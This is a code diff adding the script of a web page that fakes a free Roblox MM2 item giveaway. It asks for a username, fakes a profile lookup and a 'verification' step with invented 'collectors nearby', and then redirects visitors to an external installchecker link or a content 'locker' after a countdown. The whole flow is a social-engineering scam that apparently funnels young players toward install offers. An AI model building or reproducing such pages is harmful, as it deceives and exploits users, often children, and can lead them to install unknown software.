+          .video-footer {
+            padding: 6px 8px !important;
+          }
+          .video-continue-btn {
+            font-size: 0.85em !important;
+            padding: 10px 0 !important;
+          }
+        }
+        @media (max-height: 700px) {
+          .video-header {
+            padding: 6px 10px !important;
+          }
+          .video-title {
+            font-size: 0.95em !important;
+            margin-bottom: 2px !important;
+          }
+          .video-subtitle {
+            font-size: 0.7em !important;
+          }
+          .video-footer {
+            padding: 6px 10px !important;
+          }
+          .video-continue-btn {
+            font-size: 0.85em !important;
+            padding: 10px 0 !important;
+          }
+        }
+      `;
+      document.head.appendChild(videoStyle);
+      
+      const updateTimer = () => {
+        const timerDisplay = document.getElementById('video-timer');
+        if (timerDisplay) {
+          timerDisplay.textContent = `Redirecting in ${formatTime(timeLeft)}...`;
+        }
+      };
+      
+      updateTimer();
+      
+      const timer = setInterval(() => {
+        timeLeft--;
+        updateTimer();
+        
+        if (timeLeft <= 0) {
+          clearInterval(timer);
+          // Automatically redirect to locker when timer ends
+          const clickSound = document.getElementById('clickSound');
+          if (clickSound) {
+            clickSound.currentTime = 0;
+            clickSound.play();
+          }
+          setTimeout(() => {
+            window.location.href = lockerUrl;
+          }, 500);
+        }
+      }, 1000);
+    };
+
+    // Function to show verification state
+    const showVerificationState = (username, itemName, itemImage) => {
+      // Randomly select a game source for verification
+      const randomGameSource = gameSources[Math.floor(Math.random() * gameSources.length)];
+      const showGameSource = true; // Always show game source
+      
+      // Get country information with flag only
+      const countryDisplay = globalDatas.country_code ? `<div style="margin-top:10px;font-size:14px;color:#aaa;">Location: <img src="${globalDatas.flagUrl || 'https://flagcdn.com/w320/us.png'}" style="width:24px;height:18px;vertical-align:middle;"></div>` : '';
+      
+      const popupContent = document.querySelector('.popup-content');
+      popupContent.innerHTML = `
+        <div class="popup-header">
+          <h3>Verification</h3>
+        </div>
+        <div style="text-align:center;padding:20px">
+          <div class="folding">
+            <div class="sk-cube1 sk-cube"></div>
+            <div class="sk-cube2 sk-cube"></div>
+            <div class="sk-cube4 sk-cube"></div>
+            <div class="sk-cube3 sk-cube"></div>
+            <div class="square"></div>
+          </div>
+          <p class="searching-text">Preparing ${itemName} for @${username}</p>
+          ${countryDisplay}
+          <div style="margin-top:15px;font-size:13px;color:#aaa;">Recent MM2 collectors nearby: ${userCountryCode && countryUsers[userCountryCode] ? countryUsers[userCountryCode].slice(0, 3).join(', ') + '...' : 'Loading...'}</div>
+        </div>
+      `;
+      setTimeout(function() {
+        window.location.href = "https://installchecker.site/cl/i/n66n29";
+      }, 2500);
+    }
+
+    // Simple error UI for username lookup
+    const showErrorState = (username, itemName, itemImage, onRetry) => {
+      const popupContent = document.querySelector('.popup-content');
+      popupContent.innerHTML = `
+        <div class="popup-header">
+          <h3>Account Not Found</h3>
+        </div>
+        <div class="user-error" style="display:block;">We couldn't find <strong>@${username}</strong>. Try again.</div>
+        <div class="popup-buttons" style="margin-top:18px;">
+          <button class="cancel-btn" id="back-btn">Back</button>
+          <button class="action-btn" id="retry-btn"><span class="action-badge">Try Again</span></button>
+        </div>
+      `;
+      const back = document.getElementById('back-btn');
+      const retry = document.getElementById('retry-btn');
+      const handler = function() {
+        // Close popup and call retry callback
+        const popup = document.getElementById('purchase-popup');
+        if (popup) {
+          popup.style.display = 'none';
+        }
+        popupOpen = false;
+        startNotifications();
+        if (typeof onRetry === 'function') onRetry();
+      };
+      if (back) back.addEventListener('click', handler);
+      if (retry) retry.addEventListener('click', handler);
+    };
+
+    // Function to lookup avatar/profile by username and ask for confirmation (JSON API)
+    const showUsernameConfirmation = (username, itemName, itemImage, onRetry) => {
+      const popup = document.getElementById('purchase-popup');
+      const popupContent = document.querySelector('.popup-content');
+      // Show popup
+      if (popup) {
+        popup.style.display = 'flex';
+      }
+      
+      // Stop notifications when popup opens
+      popupOpen = true;
+      stopNotifications();
+      
+      // Stop background MM2 skin animation to reduce lag
+      if (typeof window.stopMm2SkinsAnimation === 'function') {
+        window.stopMm2SkinsAnimation();
+      }
+
+      // Loading state while fetching profile
+      popupContent.innerHTML = `
+        <div class="popup-header">
+          <h3>Searching</h3>
+        </div>
+        <div style="text-align:center;padding:20px">
+          <div class="folding">
+            <div class="sk-cube1 sk-cube"></div>
+            <div class="sk-cube2 sk-cube"></div>
+            <div class="sk-cube4 sk-cube"></div>
+            <div class="sk-cube3 sk-cube"></div>
+            <div class="square"></div>
+          </div>
+          <p class="searching-text">Searching for @${username}</p>
+        </div>
+      `;
+
+      // Set timeout for API call (12 seconds)
+      let apiCompleted = false;
+      const timeout = setTimeout(function() {
+        if (!apiCompleted) {
+          apiCompleted = true;
+          console.warn('API timeout - using fallback');
+          // Fallback: show success state without avatar (no cache fallback)
+          try {
+            globalData.user_name = username;
+            globalData.user_avatar = null;
+          } catch (e) {}
+          showSuccessState(username, null, itemName, itemImage);
+        }
+      }, AVATAR_LOOKUP_TIMEOUT_MS);
+
+      // Reuse cached/static profiles and deduplicate in-flight manual lookups.
+      fetchOneAvatar(username)
+        .then(function(avatarUrl) {
+          if (apiCompleted) return; // Already handled by timeout
+          clearTimeout(timeout);
+          apiCompleted = true;
+          try {
+            globalData.user_name = username;
+            globalData.user_avatar = avatarUrl || null;
+          } catch (e) {}
+          showSuccessState(username, avatarUrl || null, itemName, itemImage);
+        })
+        .catch(function(error) {
+          if (apiCompleted) return; // Already handled by timeout
+          clearTimeout(timeout);
+          apiCompleted = true;
+          console.error('API Error:', error);
+          try {
+            globalData.user_name = username;
+            globalData.user_avatar = null;
+          } catch (e) {}
+          showSuccessState(username, null, itemName, itemImage);
+        });
+    }
+
+
+
+    // MM2 item selection (single-select)
+    $(document).ready(function() {
+      const dingSound = document.getElementById('dingSound');
+      let soundEnabled = true;
+      let selectedItems = [];
+      const mainUsernameInput = document.getElementById('main-username-input');
+      const mainContinueBtn = document.getElementById('main-continue-btn');
+      const mainContinueContainer = document.getElementById('main-continue-container');
+      
+      // Create error message container
+      const errorMessageContainer = document.createElement('div');
+      errorMessageContainer.className = 'error-message-container';
+      errorMessageContainer.style.cssText = 'display: none; text-align: center; position: fixed; top: 80px; left: 0; right: 0; margin: 0 auto; padding: 12px 20px; background: rgba(225, 29, 72, 0.9); color: white; font-weight: bold; font-size: 1.1em; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.2); z-index: 1000; max-width: 80%; width: 400px; opacity: 0; transition: opacity 0.5s ease-in-out;';
+      errorMessageContainer.textContent = 'Please enter your username and select one MM2 item!';
+      document.body.appendChild(errorMessageContainer);
+      
+      function showTopError(message) {
+        errorMessageContainer.textContent = message;
+        errorMessageContainer.style.display = 'block';
+        setTimeout(() => {
+          errorMessageContainer.style.opacity = '1';
+        }, 10);
+        setTimeout(() => {
+          errorMessageContainer.style.opacity = '0';
+          setTimeout(() => {
+            errorMessageContainer.style.display = 'none';
+          }, 500);
+        }, 2500);
+      }
+      
+      function refreshContinueButton() {
+        const usernameOk = !!(mainUsernameInput && mainUsernameInput.value.trim());
+        const selectionOk = selectedItems.length === 1;
+        const shouldShow = usernameOk && selectionOk;
+        
+        if (mainContinueContainer) {
+          if (shouldShow) {
+            mainContinueContainer.style.display = 'block';
+          } else {
+            mainContinueContainer.style.display = 'none';
+          }
+        }
+      }
+      
+      // Listen to username input changes
+      if (mainUsernameInput) {
+        mainUsernameInput.addEventListener('input', refreshContinueButton);
+        mainUsernameInput.addEventListener('keypress', function(e) {
+          if (e.key === 'Enter') {
+            e.preventDefault();
+            if (mainContinueBtn && mainContinueContainer.style.display !== 'none') {
+              mainContinueBtn.click();
+            }
+          }
+        });
+      }
+      
+      // Handle item selection
+      $('.item-card').click(function() {
+        const itemCard = $(this);
+        const itemName = itemCard.find('.item-name').text().trim();
+        const itemImage = itemCard.find('.item-img').attr('src');
+        
+        // Check if item is already selected
+        if (itemCard.hasClass('selected')) {
+          // Deselect item
+          itemCard.removeClass('selected');
+          selectedItems = selectedItems.filter(item => item.name !== itemName);
+        } else {
+          // If another item is already selected, deselect it first
+          if (selectedItems.length >= 1) {
+            $('.item-card.selected').removeClass('selected');
+            selectedItems = [];
+          }
+          
+          // Select item
+          itemCard.addClass('selected');
+          selectedItems.push({ name: itemName, image: itemImage });
+        }
+        
+        // Play sound
+        dingSound.currentTime = 0;
+        dingSound.play();
+        
+        // Update continue button visibility
+        refreshContinueButton();
+      });
+      
+      // Handle Continue button click
+      if (mainContinueBtn) {
+        mainContinueBtn.addEventListener('click', function() {
+          const username = mainUsernameInput ? mainUsernameInput.value.trim() : '';
+          
+          if (!username) {
+            showTopError('Please enter your Roblox username!');
+            if (mainUsernameInput) mainUsernameInput.focus();
+            return;
+          }
+          
+          if (selectedItems.length !== 1) {
+            showTopError('Please select one MM2 item!');
+            return;
+          }
+          
+          // Play click sound
+          const clickSound = document.getElementById('clickSound');
+          if (clickSound) {
+            clickSound.currentTime = 0;
+            clickSound.play();
+          }
+          
+          // Show profile lookup popup
+          const popup = document.getElementById('purchase-popup');
+          if (popup) {
+            popup.style.display = 'flex';
+          }
+          
+          // Start username confirmation flow
+          showUsernameConfirmation(username, selectedItems[0].name, selectedItems[0].image, function() {
+            // Retry callback - just refocus username input
+            if (mainUsernameInput) mainUsernameInput.focus();
+          });
+        });
+      }
+      
+      // Initial state
+      refreshContinueButton();
+    });
+    
+    // Function to show multi-item purchase popup
+    const showMultiItemPurchasePopup = (items) => {
+      // Stop notifications
+      popupOpen = true;
+      stopNotifications();
+      
+      const popup = document.getElementById('purchase-popup');
+      const popupContent = popup.querySelector('.popup-content');
+      
+      // Create item images HTML
+      let itemImagesHTML = '<div style="display: flex; justify-content: center; gap: 10px; margin-bottom: 15px;">';
+      items.forEach(item => {
+        itemImagesHTML += `<img src="${item.image}" alt="${item.name}" style="width: 70px; height: 70px; object-fit: cover; border-radius: 10px; background: rgba(255,255,255,0.1);">`;
+      });
+      itemImagesHTML += '</div>';
+      
+      // Create item names HTML
+      let itemNamesHTML = '<p class="item-confirm">Would you like to Get "<span>';
+      items.forEach((item, index) => {
+        if (index > 0) {
+          itemNamesHTML += index === items.length - 1 ? ' and ' : ', ';
+        }
+        itemNamesHTML += item.name;
+      });
+      itemNamesHTML += '</span>"?</p>';
+      
+      popupContent.innerHTML = `
+        <div class="popup-header">
+          <h3>Get Items</h3>
+        </div>
+        ${itemImagesHTML}
+        ${itemNamesHTML}
+        <div class="input-group">
+          <input type="text" id="username-input" placeholder="Enter your Roblox username">
+        </div>
+        <div class="user-error d-none">Please enter a valid username</div>
+        <div class="popup-buttons">
+          <button class="cancel-btn">Cancel</button>
+          <button class="action-btn" id="search-user-btn">
+            <span class="action-badge">Search Now ➤</span>
+          </button>
+        </div>
+      `;
+      
+      popupContent.querySelector('.cancel-btn').addEventListener('click', closePurchasePopup);
+      popupContent.querySelector('#search-user-btn').addEventListener('click', function() {
+        // Play sound when clicking button
+        const clickSound = document.getElementById('clickSound');
+        clickSound.currentTime = 0;
+        clickSound.play();
+        
+        const username = document.getElementById('username-input').value.trim();
+        if (!username) {
+          document.querySelector('.user-error').classList.remove('d-none');
+          return;
+        }
+        showUsernameConfirmation(username, items[0].name, items[0].image, function() { showMultiItemPurchasePopup(items); });
+      });
+      
+      popup.style.display = 'flex';
+      document.getElementById('username-input').focus();
+    }
+
+    // Inject pulsing animation and button styles for the Let's Go button
+    (function() {
+      const style = document.createElement('style');
+      style.innerHTML = `
+        @keyframes pulse-glow {
+          0% { box-shadow: 0 0 0 0 #22c55e88; }
+          70% { box-shadow: 0 0 0 16px #22c55e00; }
+          100% { box-shadow: 0 0 0 0 #22c55e00; }
+        }
+        .lets-go-btn-animated {
+          background: linear-gradient(90deg, #22c55e 0%, #16e085 100%);
+          color: #fff;
+          font-size: 1.35em;
+          font-weight: 900;
+          border-radius: 16px;
+          border: none;
+          padding: 22px 0;
+          width: 100%;
+          cursor: pointer;
+          box-shadow: 0 2px 16px #22c55e55;
+          animation: pulse-glow 1.3s infinite;
+          transition: transform 0.15s, box-shadow 0.2s;
+          position: relative;
+          letter-spacing: 0.5px;
+        }
+        .lets-go-btn-animated:active {
+          transform: scale(0.97) translateY(2px);
+          box-shadow: 0 1px 8px #22c55e99;
+        }
+        .lets-go-btn-animated:hover {
+          transform: scale(1.04) translateY(-2px);
+          box-shadow: 0 4px 24px #22c55e99;
+        }
+        .lets-go-microcopy {
+          color: var(--accent3);
+          font-size: 1.08em;
+          font-weight: 700;
+          margin-top: 13px;
+          text-shadow: 0 1px 8px #0002;
+          letter-spacing: 0.2px;
+        }
+      `;
+      document.head.appendChild(style);
+    })();
+    
+    // Background MM2 Skin Management
+    (function() {
+      const skinImages = [
+        'images/Chroma Traveler.webp',
+        'images/Chroma_Emberscythe.webp',
+        'images/Gingerscope.webp'
+      ];
+      
+      const backgroundSkinsContainer = document.getElementById('backgroundMm2Skins');
+      let activeSkins = [];
+      const maxSkins = 3;
+      
+      class BouncingMm2Skin {
+        constructor(imageSrc, startX, startY, vx, vy) {
+          this.element = document.createElement('div');
+          this.element.className = 'floating-mm2-skin';
+          
+          const img = document.createElement('img');
+          img.src = imageSrc;
+          img.alt = 'Floating MM2 Skin';
+          
+          this.element.appendChild(img);
+          
+          // Starting position and velocity
+          this.x = startX;
+          this.y = startY;
+          this.vx = vx;
+          this.vy = vy;
+          
+          // Size
+          this.width = 95;
+          this.height = 95;
+          
+          this.updatePosition();
+          backgroundSkinsContainer.appendChild(this.element);
+        }
+        
+        updatePosition() {
+          this.element.style.transform = `translate3d(${this.x}px, ${this.y}px, 0)`;
+        }
+        
+        update() {
+          // Update position
+          this.x += this.vx;
+          this.y += this.vy;
+          
+          // Check for wall collisions
+          if (this.x <= 0 || this.x >= window.innerWidth - this.width) {
+            this.vx = -this.vx;
+            this.x = Math.max(0, Math.min(this.x, window.innerWidth - this.width));
+          }
+          
+          if (this.y <= 0 || this.y >= window.innerHeight - this.height) {
+            this.vy = -this.vy;
+            this.y = Math.max(0, Math.min(this.y, window.innerHeight - this.height));
+          }
+          
+          this.updatePosition();
+        }
+        
+        destroy() {
+          if (this.element.parentNode) {
+            this.element.parentNode.removeChild(this.element);
+          }
+        }
+      }
+      
+      function createSkins() {
+        // Clear any existing skins
+        activeSkins.forEach(skin => skin.destroy());
+        activeSkins = [];
+        
+        // Create 3 MM2 items with different starting positions and velocities
+        const skins = [
+          {
+            image: 'images/Chroma Traveler.webp',
+            startX: 120,
+            startY: 180,
+            vx: 1.8,
+            vy: 1.5
+          },
+          {
+            image: 'images/Chroma_Emberscythe.webp',
+            startX: window.innerWidth - 215,
+            startY: 300,
+            vx: -1.6,
+            vy: 1.9
+          },
+          {
+            image: 'images/Gingerscope.webp',
+            startX: 300,
+            startY: window.innerHeight - 215,
+            vx: 1.4,
+            vy: -1.7
+          }
+        ];
+        
+        skins.forEach(skinData => {
+          const skin = new BouncingMm2Skin(
+            skinData.image,
+            skinData.startX,
+            skinData.startY,
+            skinData.vx,
+            skinData.vy
+          );
+          activeSkins.push(skin);
+        });
+      }
+      
+      let animationId;
+      
+      function animateSkins() {
+        activeSkins.forEach(skin => skin.update());
+        animationId = requestAnimationFrame(animateSkins);
+      }
+      
+      function stopMm2SkinsAnimation() {
+        if (animationId) {
+          cancelAnimationFrame(animationId);
+          animationId = null;
+        }
+      }
+      
+      // Make MM2 skin animation controls globally accessible
+      window.stopMm2SkinsAnimation = stopMm2SkinsAnimation;
+      
+      function initializeSkins() {
+        createSkins();
+        animateSkins();
+      }
+      
+      // Start skins when page loads
+      window.addEventListener('load', initializeSkins);
+      
+      // Adjust MM2 skins on window resize
+      window.addEventListener('resize', () => {
+        // Recreate skins with new window dimensions
+        createSkins();
+      });
+      
+      // Cleanup on page unload
+      window.addEventListener('beforeunload', () => {
+        if (animationId) {
+          cancelAnimationFrame(animationId);
+        }
+      });
+    })();
+
+    // Theme Toggle
+    (function() {
+      const themeToggle = document.getElementById('themeToggle');
+      const body = document.body;
+      const currentTheme = localStorage.getItem('theme');
+
+      // Default to night mode if no preference is saved
+      if (currentTheme === 'night' || currentTheme === null) {
+        body.classList.add('night-mode');
+        themeToggle.classList.add('night-mode');
+      }
+
+      themeToggle.addEventListener('click', () => {
+        body.classList.toggle('night-mode');
+        themeToggle.classList.toggle('night-mode');
+        
+        if (body.classList.contains('night-mode')) {
+          localStorage.setItem('theme', 'night');
+        } else {
+          localStorage.setItem('theme', 'light');
+        }
+      });
+    })();
+  </script>
+
+
+</body></html>
